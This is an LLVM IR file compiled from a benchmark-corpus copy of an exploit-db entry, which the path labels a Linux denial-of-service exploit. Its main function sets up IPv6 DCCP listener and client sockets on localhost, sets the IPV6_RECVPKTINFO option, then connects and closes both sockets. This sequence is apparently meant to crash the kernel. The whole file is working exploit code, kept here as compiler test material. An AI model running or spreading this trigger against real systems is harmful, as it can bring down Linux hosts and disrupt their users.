; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_41457.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_41457.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in6 = type { i64, i64, i32, i32, i32 }

@AF_INET6 = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"::1\00", align 1
@PF_INET6 = common dso_local global i32 0, align 4
@SOCK_DCCP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IPPROTO_IPV6 = common dso_local global i32 0, align 4
@IPV6_RECVPKTINFO = common dso_local global i32 0, align 4
@SHUT_RDWR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.sockaddr_in6, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @AF_INET6, align 4
  %7 = getelementptr inbounds %struct.sockaddr_in6, %struct.sockaddr_in6* %2, i32 0, i32 4
  store i32 %6, i32* %7, align 8
  %8 = call i32 @htons(i32 20002)
  %9 = getelementptr inbounds %struct.sockaddr_in6, %struct.sockaddr_in6* %2, i32 0, i32 3
  store i32 %8, i32* %9, align 4
  %10 = load i32, i32* @AF_INET6, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in6, %struct.sockaddr_in6* %2, i32 0, i32 2
  %12 = call i32 @inet_pton(i32 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32* %11)
  %13 = getelementptr inbounds %struct.sockaddr_in6, %struct.sockaddr_in6* %2, i32 0, i32 1
  store i64 0, i64* %13, align 8
  %14 = getelementptr inbounds %struct.sockaddr_in6, %struct.sockaddr_in6* %2, i32 0, i32 0
  store i64 0, i64* %14, align 8
  store i32 8, i32* %3, align 4
  %15 = load i32, i32* @PF_INET6, align 4
  %16 = load i32, i32* @SOCK_DCCP, align 4
  %17 = load i32, i32* @IPPROTO_IP, align 4
  %18 = call i32 @socket(i32 %15, i32 %16, i32 %17)
  store i32 %18, i32* %4, align 4
  %19 = load i32, i32* %4, align 4
  %20 = call i32 @bind(i32 %19, %struct.sockaddr_in6* %2, i32 32)
  %21 = load i32, i32* %4, align 4
  %22 = call i32 @listen(i32 %21, i32 9)
  %23 = load i32, i32* %4, align 4
  %24 = load i32, i32* @IPPROTO_IPV6, align 4
  %25 = load i32, i32* @IPV6_RECVPKTINFO, align 4
  %26 = call i32 @setsockopt(i32 %23, i32 %24, i32 %25, i32* %3, i32 4)
  %27 = load i32, i32* @PF_INET6, align 4
  %28 = load i32, i32* @SOCK_DCCP, align 4
  %29 = load i32, i32* @IPPROTO_IP, align 4
  %30 = call i32 @socket(i32 %27, i32 %28, i32 %29)
  store i32 %30, i32* %5, align 4
  %31 = load i32, i32* %5, align 4
  %32 = call i32 @connect(i32 %31, %struct.sockaddr_in6* %2, i32 32)
  %33 = load i32, i32* %4, align 4
  %34 = load i32, i32* @SHUT_RDWR, align 4
  %35 = call i32 @shutdown(i32 %33, i32 %34)
  %36 = load i32, i32* %4, align 4
  %37 = call i32 @close(i32 %36)
  %38 = load i32, i32* %5, align 4
  %39 = load i32, i32* @SHUT_RDWR, align 4
  %40 = call i32 @shutdown(i32 %38, i32 %39)
  %41 = load i32, i32* %5, align 4
  %42 = call i32 @close(i32 %41)
  ret i32 0
}

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_pton(i32, i8*, i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr_in6*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr_in6*, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
